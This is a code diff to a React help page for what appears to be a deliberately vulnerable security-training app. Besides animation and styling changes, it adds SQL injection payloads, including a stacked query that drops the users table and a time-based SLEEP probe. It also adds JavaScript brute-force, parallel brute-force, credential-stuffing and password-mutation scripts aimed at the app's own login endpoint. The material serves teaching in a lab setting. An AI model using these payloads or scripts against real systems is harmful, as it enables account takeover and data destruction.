@@ -6,7 +6,7 @@ import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/com
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
-import { Shield, ArrowLeft, Code, Terminal, AlertTriangle, BookOpen, Copy, Check } from "lucide-react"
+import { Shield, ArrowLeft, Code, Terminal, AlertTriangle, BookOpen, Copy, Check, Zap, Lock, Eye } from "lucide-react"
 import Link from "next/link"
 import { fadeInUp, staggerContainer } from "@/lib/animations"
 
@@ -29,6 +29,7 @@ export default function HelpPage() {
       explanation:
         "This works because the SQL query becomes: SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'. The OR '1'='1' makes the condition always true.",
       severity: "high",
+      technique: "Boolean-based",
     },
     {
       id: "comment-bypass",
@@ -39,6 +40,7 @@ export default function HelpPage() {
       explanation:
         "The -- comments out the rest of the query, so it becomes: SELECT * FROM users WHERE username = 'admin'-- AND password = ''. Everything after -- is ignored.",
       severity: "high",
+      technique: "Comment injection",
     },
     {
       id: "always-true",
@@ -49,6 +51,7 @@ export default function HelpPage() {
       explanation:
         "This makes the query: SELECT * FROM users WHERE username = '' OR 1=1-- AND password = 'anything'. Since 1=1 is always true, it returns all users.",
       severity: "critical",
+      technique: "Tautology",
     },
     {
       id: "union-attack",
@@ -59,53 +62,207 @@ export default function HelpPage() {
       explanation:
         "UNION allows combining results from multiple SELECT statements. This can be used to extract data from other tables or inject fake data.",
       severity: "critical",
+      technique: "UNION-based",
+    },
+    {
+      id: "stacked-queries",
+      title: "Stacked Queries Attack",
+      description: "Execute multiple SQL statements",
+      username: "admin'; DROP TABLE users--",
+      password: "",
+      explanation:
+        "Attempts to execute multiple statements separated by semicolons. This could potentially drop tables or modify data if the database allows stacked queries.",
+      severity: "critical",
+      technique: "Stacked queries",
+    },
+    {
+      id: "time-based",
+      title: "Time-Based Blind Injection",
+      description: "Use database sleep functions to detect vulnerabilities",
+      username: "admin' AND SLEEP(5)--",
+      password: "",
+      explanation:
+        "If the response is delayed by 5 seconds, it confirms the injection point. Useful when no visible output is returned.",
+      severity: "high",
+      technique: "Time-based blind",
     },
   ]
 
   const bruteForceExamples = [
     {
       id: "simple-brute",
-      title: "Simple Brute Force",
-      description: "Try common passwords sequentially",
-      code: `// Simple brute force example
-const passwords = ['password', '123456', 'admin123', 'qwerty'];
-for (const pwd of passwords) {
-  const response = await fetch('/api/login', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ username: 'admin', password: pwd })
-  });
-  const data = await response.json();
-  if (data.success) {
-    console.log('Found password:', pwd);
-    break;
+      title: "Simple Sequential Brute Force",
+      description: "Try common passwords one by one",
+      code: `// Simple brute force attack
+const commonPasswords = [
+  'password', '123456', '12345678', 'qwerty', 
+  'abc123', 'monkey', 'letmein', 'admin123'
+];
+
+async function bruteForce(username) {
+  for (const password of commonPasswords) {
+    const response = await fetch('/api/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username, password })
+    });
+    
+    const data = await response.json();
+    
+    if (data.success) {
+      console.log(\`✓ Password found: \${password}\`);
+      return { username, password };
+    }
+    
+    console.log(\`✗ Failed: \${password}\`);
   }
-}`,
+  
+  return null;
+}
+
+// Execute attack
+bruteForce('admin');`,
       language: "javascript",
+      complexity: "Basic",
     },
     {
       id: "parallel-brute",
       title: "Parallel Brute Force",
-      description: "Test multiple passwords simultaneously",
+      description: "Test multiple passwords simultaneously for speed",
       code: `// Parallel brute force with Promise.all
-const passwords = ['password', '123456', 'admin123', 'qwerty'];
-const attempts = passwords.map(pwd => 
-  fetch('/api/login', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ username: 'admin', password: pwd })
-  }).then(r => r.json())
-);
-const results = await Promise.all(attempts);
-const success = results.find(r => r.success);
-if (success) console.log('Password found!');`,
+async function parallelBruteForce(username, passwords) {
+  const batchSize = 10; // Concurrent requests
+  
+  for (let i = 0; i < passwords.length; i += batchSize) {
+    const batch = passwords.slice(i, i + batchSize);
+    
+    const attempts = batch.map(password => 
+      fetch('/api/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, password })
+      })
+      .then(r => r.json())
+      .then(data => ({ password, success: data.success }))
+    );
+    
+    const results = await Promise.all(attempts);
+    const success = results.find(r => r.success);
+    
+    if (success) {
+      console.log(\`✓ Password cracked: \${success.password}\`);
+      return success;
+    }
+    
+    console.log(\`Tested \${i + batch.length}/\${passwords.length}\`);
+  }
+  
+  return null;
+}`,
       language: "javascript",
+      complexity: "Intermediate",
+    },
+    {
+      id: "credential-stuffing",
+      title: "Credential Stuffing",
+      description: "Use leaked username:password combinations",
+      code: `// Credential stuffing from leaked databases
+const leakedCredentials = [
+  { username: 'admin', password: 'admin123' },
+  { username: 'user1', password: 'password123' },
+  { username: 'john.doe', password: 'qwerty' },
+  // ... more leaked credentials
+];
+
+async function credentialStuffing(credentials) {
+  const validAccounts = [];
+  
+  for (const { username, password } of credentials) {
+    try {
+      const response = await fetch('/api/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, password })
+      });
+      
+      const data = await response.json();
+      
+      if (data.success) {
+        console.log(\`✓ Valid: \${username}:\${password}\`);
+        validAccounts.push({ username, password, data });
+      }
+    } catch (error) {
+      console.error(\`Error testing \${username}\`);
+    }
+  }
+  
+  return validAccounts;
+}`,
+      language: "javascript",
+      complexity: "Advanced",
+    },
+    {
+      id: "dictionary-attack",
+      title: "Dictionary Attack with Mutations",
+      description: "Generate password variations from base words",
+      code: `// Dictionary attack with common mutations
+function generateMutations(baseWord) {
+  const mutations = [baseWord];
+  
+  // Capitalization
+  mutations.push(baseWord.toLowerCase());
+  mutations.push(baseWord.toUpperCase());
+  mutations.push(
+    baseWord.charAt(0).toUpperCase() + 
+    baseWord.slice(1).toLowerCase()
+  );
+  
+  // Number additions
+  for (let i = 0; i <= 999; i++) {
+    mutations.push(baseWord + i);
+  }
+  
+  // L33t speak
+  const l33t = baseWord
+    .replace(/a/gi, '4')
+    .replace(/e/gi, '3')
+    .replace(/i/gi, '1')
+    .replace(/o/gi, '0')
+    .replace(/s/gi, '5');
+  mutations.push(l33t);
+  
+  // Special characters
+  ['!', '@', '#', '$', '123'].forEach(suffix => {
+    mutations.push(baseWord + suffix);
+  });
+  
+  return mutations;
+}
+
+// Attack with mutations
+const baseWords = ['password', 'admin', 'welcome'];
+const allPasswords = baseWords.flatMap(generateMutations);
+
+bruteForce('admin', allPasswords);`,
+      language: "javascript",
+      complexity: "Advanced",
     },
   ]
 
   return (
     <div className="min-h-screen bg-background relative overflow-hidden">
       <div className="absolute inset-0 bg-gradient-to-br from-primary/5 via-background to-secondary/5" />
+      <motion.div
+        className="absolute inset-0 opacity-30"
+        animate={{
+          background: [
+            "radial-gradient(circle at 20% 50%, rgba(120, 119, 198, 0.15) 0%, transparent 50%)",
+            "radial-gradient(circle at 80% 50%, rgba(120, 119, 198, 0.15) 0%, transparent 50%)",
+            "radial-gradient(circle at 20% 50%, rgba(120, 119, 198, 0.15) 0%, transparent 50%)",
+          ],
+        }}
+        transition={{ duration: 10, repeat: Number.POSITIVE_INFINITY, ease: "linear" }}
+      />
 
       <motion.header
         className="border-b border-border relative z-10 backdrop-blur-sm bg-background/80"
@@ -117,21 +274,38 @@ if (success) console.log('Password found!');`,
           <div className="flex items-center justify-between">
             <div className="flex items-center gap-4">
               <Link href="/">
-                <motion.div whileHover={{ scale: 1.05 }} whileTap={{ scale: 0.95 }}>
-                  <Button variant="ghost" size="sm">
+                <motion.div
+                  whileHover={{ scale: 1.05, x: -5 }}
+                  whileTap={{ scale: 0.95 }}
+                  transition={{ type: "spring", stiffness: 400 }}
+                >
+                  <Button variant="ghost" size="sm" className="hover-lift">
                     <ArrowLeft className="w-4 h-4 mr-2" />
                     Back to Login
                   </Button>
                 </motion.div>
               </Link>
-              <motion.div className="flex items-center gap-2" whileHover={{ scale: 1.05 }}>
-                <BookOpen className="w-6 h-6 text-primary" />
-                <span className="font-mono text-lg font-semibold">Documentation</span>
+              <motion.div
+                className="flex items-center gap-2"
+                whileHover={{ scale: 1.05 }}
+                transition={{ type: "spring", stiffness: 400 }}
+              >
+                <motion.div
+                  animate={{ rotate: [0, 5, -5, 0] }}
+                  transition={{ duration: 2, repeat: Number.POSITIVE_INFINITY, repeatDelay: 3 }}
+                >
+                  <BookOpen className="w-6 h-6 text-primary" />
+                </motion.div>
+                <span className="font-mono text-lg font-semibold">Attack Documentation</span>
               </motion.div>
             </div>
             <Link href="/admin">
-              <motion.div whileHover={{ scale: 1.05 }} whileTap={{ scale: 0.95 }}>
-                <Button variant="outline" size="sm">
+              <motion.div
+                whileHover={{ scale: 1.05 }}
+                whileTap={{ scale: 0.95 }}
+                transition={{ type: "spring", stiffness: 400 }}
+              >
+                <Button variant="outline" size="sm" className="hover-glow bg-transparent">
                   <Terminal className="w-4 h-4 mr-2" />
                   Admin Dashboard
                 </Button>
@@ -148,100 +322,183 @@ if (success) console.log('Password found!');`,
           transition={{ duration: 0.5 }}
           className="mb-8"
         >
-          <h1 className="text-4xl font-bold mb-4">Security Training Guide</h1>
-          <p className="text-muted-foreground text-lg leading-relaxed">
-            Learn about common web vulnerabilities and how to exploit them in this safe training environment.
-          </p>
+          <motion.h1
+            className="text-4xl font-bold mb-4 bg-gradient-to-r from-primary via-purple-500 to-primary bg-clip-text text-transparent animate-gradient-shift"
+            animate={{ backgroundPosition: ["0% 50%", "100% 50%", "0% 50%"] }}
+            transition={{ duration: 5, repeat: Number.POSITIVE_INFINITY }}
+          >
+            Professional Security Training Guide
+          </motion.h1>
+          <motion.p
+            className="text-muted-foreground text-lg leading-relaxed"
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+            transition={{ delay: 0.2 }}
+          >
+            Learn advanced penetration testing techniques and security vulnerabilities in this comprehensive training
+            environment.
+          </motion.p>
         </motion.div>
 
         <Tabs defaultValue="sql-injection" className="space-y-6">
-          <TabsList className="grid w-full grid-cols-3">
-            <TabsTrigger value="sql-injection">SQL Injection</TabsTrigger>
-            <TabsTrigger value="brute-force">Brute Force</TabsTrigger>
-            <TabsTrigger value="prevention">Prevention</TabsTrigger>
-          </TabsList>
+          <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.3 }}>
+            <TabsList className="grid w-full grid-cols-3 backdrop-blur-sm bg-secondary/50">
+              <TabsTrigger value="sql-injection" className="transition-smooth">
+                <Code className="w-4 h-4 mr-2" />
+                SQL Injection
+              </TabsTrigger>
+              <TabsTrigger value="brute-force" className="transition-smooth">
+                <Zap className="w-4 h-4 mr-2" />
+                Brute Force
+              </TabsTrigger>
+              <TabsTrigger value="prevention" className="transition-smooth">
+                <Shield className="w-4 h-4 mr-2" />
+                Prevention
+              </TabsTrigger>
+            </TabsList>
+          </motion.div>
 
           <TabsContent value="sql-injection" className="space-y-6">
             <motion.div variants={staggerContainer} initial="initial" animate="animate">
-              <Card className="backdrop-blur-sm bg-card/50 mb-6">
-                <CardHeader>
-                  <CardTitle className="flex items-center gap-2">
-                    <Code className="w-5 h-5" />
-                    What is SQL Injection?
-                  </CardTitle>
-                </CardHeader>
-                <CardContent className="space-y-4">
-                  <p className="text-muted-foreground leading-relaxed">
-                    SQL Injection is a code injection technique that exploits vulnerabilities in an application's
-                    database layer. Attackers can insert malicious SQL statements into input fields, which are then
-                    executed by the database.
-                  </p>
-                  <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-4">
-                    <p className="text-sm font-medium text-destructive mb-2">Vulnerable Code Example:</p>
-                    <pre className="text-xs font-mono bg-background/50 p-3 rounded overflow-x-auto">
-                      {`const query = \`SELECT * FROM users WHERE username = '\${username}' AND password = '\${password}'\``}
-                    </pre>
-                  </div>
-                </CardContent>
-              </Card>
+              <motion.div
+                initial={{ opacity: 0, scale: 0.95 }}
+                animate={{ opacity: 1, scale: 1 }}
+                transition={{ duration: 0.4 }}
+              >
+                <Card className="backdrop-blur-sm bg-card/50 mb-6 hover-lift glass-hover">
+                  <CardHeader>
+                    <CardTitle className="flex items-center gap-2">
+                      <motion.div
+                        animate={{ rotate: [0, 360] }}
+                        transition={{ duration: 20, repeat: Number.POSITIVE_INFINITY, ease: "linear" }}
+                      >
+                        <Code className="w-5 h-5 text-primary" />
+                      </motion.div>
+                      What is SQL Injection?
+                    </CardTitle>
+                  </CardHeader>
+                  <CardContent className="space-y-4">
+                    <p className="text-muted-foreground leading-relaxed">
+                      SQL Injection is a code injection technique that exploits vulnerabilities in an application's
+                      database layer. Attackers can insert malicious SQL statements into input fields, which are then
+                      executed by the database, potentially exposing sensitive data or compromising the entire system.
+                    </p>
+                    <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-4 animate-border-glow">
+                      <p className="text-sm font-medium text-destructive mb-2 flex items-center gap-2">
+                        <AlertTriangle className="w-4 h-4" />
+                        Vulnerable Code Example:
+                      </p>
+                      <pre className="text-xs font-mono bg-background/50 p-3 rounded overflow-x-auto">
+                        {`const query = \`SELECT * FROM users WHERE username = '\${username}' AND password = '\${password}'\``}
+                      </pre>
+                    </div>
+                  </CardContent>
+                </Card>
+              </motion.div>
 
               {sqlInjectionExamples.map((example, index) => (
-                <motion.div key={example.id} variants={fadeInUp} transition={{ delay: index * 0.1 }}>
-                  <Card className="backdrop-blur-sm bg-card/50 hover:shadow-lg transition-shadow duration-300">
+                <motion.div
+                  key={example.id}
+                  variants={fadeInUp}
+                  transition={{ delay: index * 0.1 }}
+                  whileHover={{ scale: 1.02 }}
+                >
+                  <Card className="backdrop-blur-sm bg-card/50 hover:shadow-xl transition-all duration-300 glass-hover">
                     <CardHeader>
                       <div className="flex items-start justify-between">
-                        <div>
-                          <CardTitle className="text-lg">{example.title}</CardTitle>
+                        <div className="flex-1">
+                          <CardTitle className="text-lg flex items-center gap-2">
+                            {example.title}
+                            <motion.div
+                              animate={{ scale: [1, 1.2, 1] }}
+                              transition={{ duration: 2, repeat: Number.POSITIVE_INFINITY, delay: index * 0.2 }}
+                            >
+                              <Lock className="w-4 h-4 text-destructive" />
+                            </motion.div>
+                          </CardTitle>
                           <CardDescription>{example.description}</CardDescription>
                         </div>
-                        <Badge variant={example.severity === "critical" ? "destructive" : "secondary"}>
-                          {example.severity}
-                        </Badge>
+                        <div className="flex gap-2">
+                          <Badge variant={example.severity === "critical" ? "destructive" : "secondary"}>
+                            {example.severity}
+                          </Badge>
+                          <Badge variant="outline">{example.technique}</Badge>
+                        </div>
                       </div>
                     </CardHeader>
                     <CardContent className="space-y-4">
                       <div className="grid md:grid-cols-2 gap-4">
                         <div className="space-y-2">
                           <div className="flex items-center justify-between">
-                            <label className="text-sm font-medium">Username</label>
-                            <Button
-                              size="sm"
-                              variant="ghost"
-                              onClick={() => copyToClipboard(example.username, `${example.id}-user`)}
-                            >
-                              {copiedCode === `${example.id}-user` ? (
-                                <Check className="w-3 h-3" />
-                              ) : (
-                                <Copy className="w-3 h-3" />
-                              )}
-                            </Button>
+                            <label className="text-sm font-medium flex items-center gap-2">
+                              <Eye className="w-3 h-3" />
+                              Username
+                            </label>
+                            <motion.div whileHover={{ scale: 1.1 }} whileTap={{ scale: 0.9 }}>
+                              <Button
+                                size="sm"
+                                variant="ghost"
+                                onClick={() => copyToClipboard(example.username, `${example.id}-user`)}
+                                className="h-7"
+                              >
+                                {copiedCode === `${example.id}-user` ? (
+                                  <Check className="w-3 h-3 text-green-500" />
+                                ) : (
+                                  <Copy className="w-3 h-3" />
+                                )}
+                              </Button>
+                            </motion.div>
                           </div>
-                          <div className="bg-secondary/50 p-3 rounded font-mono text-sm">{example.username}</div>
+                          <motion.div
+                            className="bg-secondary/50 p-3 rounded font-mono text-sm hover-glow cursor-pointer"
+                            whileHover={{ scale: 1.02 }}
+                            onClick={() => copyToClipboard(example.username, `${example.id}-user`)}
+                          >
+                            {example.username}
+                          </motion.div>
                         </div>
                         <div className="space-y-2">
                           <div className="flex items-center justify-between">
-                            <label className="text-sm font-medium">Password</label>
-                            <Button
-                              size="sm"
-                              variant="ghost"
-                              onClick={() => copyToClipboard(example.password, `${example.id}-pass`)}
-                            >
-                              {copiedCode === `${example.id}-pass` ? (
-                                <Check className="w-3 h-3" />
-                              ) : (
-                                <Copy className="w-3 h-3" />
-                              )}
-                            </Button>
+                            <label className="text-sm font-medium flex items-center gap-2">
+                              <Lock className="w-3 h-3" />
+                              Password
+                            </label>
+                            <motion.div whileHover={{ scale: 1.1 }} whileTap={{ scale: 0.9 }}>
+                              <Button
+                                size="sm"
+                                variant="ghost"
+                                onClick={() => copyToClipboard(example.password, `${example.id}-pass`)}
+                                className="h-7"
+                              >
+                                {copiedCode === `${example.id}-pass` ? (
+                                  <Check className="w-3 h-3 text-green-500" />
+                                ) : (
+                                  <Copy className="w-3 h-3" />
+                                )}
+                              </Button>
+                            </motion.div>
                           </div>
-                          <div className="bg-secondary/50 p-3 rounded font-mono text-sm">
+                          <motion.div
+                            className="bg-secondary/50 p-3 rounded font-mono text-sm hover-glow cursor-pointer"
+                            whileHover={{ scale: 1.02 }}
+                            onClick={() => copyToClipboard(example.password, `${example.id}-pass`)}
+                          >
                             {example.password || "(empty)"}
-                          </div>
+                          </motion.div>
                         </div>
                       </div>
-                      <div className="bg-primary/10 border border-primary/20 rounded-lg p-4">
-                        <p className="text-sm font-medium mb-2">How it works:</p>
-                        <p className="text-sm text-muted-foreground">{example.explanation}</p>
-                      </div>
+                      <motion.div
+                        className="bg-primary/10 border border-primary/20 rounded-lg p-4"
+                        initial={{ opacity: 0 }}
+                        animate={{ opacity: 1 }}
+                        transition={{ delay: 0.2 }}
+                      >
+                        <p className="text-sm font-medium mb-2 flex items-center gap-2">
+                          <Terminal className="w-4 h-4" />
+                          How it works:
+                        </p>
+                        <p className="text-sm text-muted-foreground leading-relaxed">{example.explanation}</p>
+                      </motion.div>
                     </CardContent>
                   </Card>
                 </motion.div>
@@ -250,10 +507,10 @@ if (success) console.log('Password found!');`,
           </TabsContent>
 
           <TabsContent value="brute-force" className="space-y-6">
-            <Card className="backdrop-blur-sm bg-card/50 mb-6">
+            <Card className="backdrop-blur-sm bg-card/50 mb-6 glass-hover hover-lift">
               <CardHeader>
                 <CardTitle className="flex items-center gap-2">
-                  <Terminal className="w-5 h-5" />
+                  <Zap className="w-5 h-5 text-warning" />
                   What is Brute Force?
                 </CardTitle>
               </CardHeader>
@@ -280,21 +537,33 @@ if (success) console.log('Password found!');`,
                 initial={{ opacity: 0, y: 20 }}
                 animate={{ opacity: 1, y: 0 }}
                 transition={{ delay: index * 0.1 }}
+                whileHover={{ scale: 1.01 }}
               >
-                <Card className="backdrop-blur-sm bg-card/50 hover:shadow-lg transition-shadow duration-300">
+                <Card className="backdrop-blur-sm bg-card/50 hover:shadow-xl transition-all duration-300 glass-hover">
                   <CardHeader>
                     <div className="flex items-start justify-between">
-                      <div>
-                        <CardTitle className="text-lg">{example.title}</CardTitle>
+                      <div className="flex-1">
+                        <CardTitle className="text-lg flex items-center gap-2">
+                          {example.title}
+                          <Badge variant="outline">{example.complexity}</Badge>
+                        </CardTitle>
                         <CardDescription>{example.description}</CardDescription>
                       </div>
-                      <Button size="sm" variant="ghost" onClick={() => copyToClipboard(example.code, example.id)}>
-                        {copiedCode === example.id ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
-                      </Button>
+                      <motion.div whileHover={{ scale: 1.1 }} whileTap={{ scale: 0.9 }}>
+                        <Button size="sm" variant="ghost" onClick={() => copyToClipboard(example.code, example.id)}>
+                          {copiedCode === example.id ? (
+                            <Check className="w-4 h-4 text-green-500" />
+                          ) : (
+                            <Copy className="w-4 h-4" />
+                          )}
+                        </Button>
+                      </motion.div>
                     </div>
                   </CardHeader>
                   <CardContent>
-                    <pre className="text-xs font-mono bg-background/50 p-4 rounded overflow-x-auto">{example.code}</pre>
+                    <pre className="text-xs font-mono bg-background/50 p-4 rounded overflow-x-auto border border-border/50">
+                      {example.code}
+                    </pre>
                   </CardContent>
                 </Card>
               </motion.div>
@@ -302,7 +571,7 @@ if (success) console.log('Password found!');`,
           </TabsContent>
 
           <TabsContent value="prevention" className="space-y-6">
-            <Card className="backdrop-blur-sm bg-card/50">
+            <Card className="backdrop-blur-sm bg-card/50 glass-hover">
               <CardHeader>
                 <CardTitle className="flex items-center gap-2">
                   <Shield className="w-5 h-5 text-primary" />
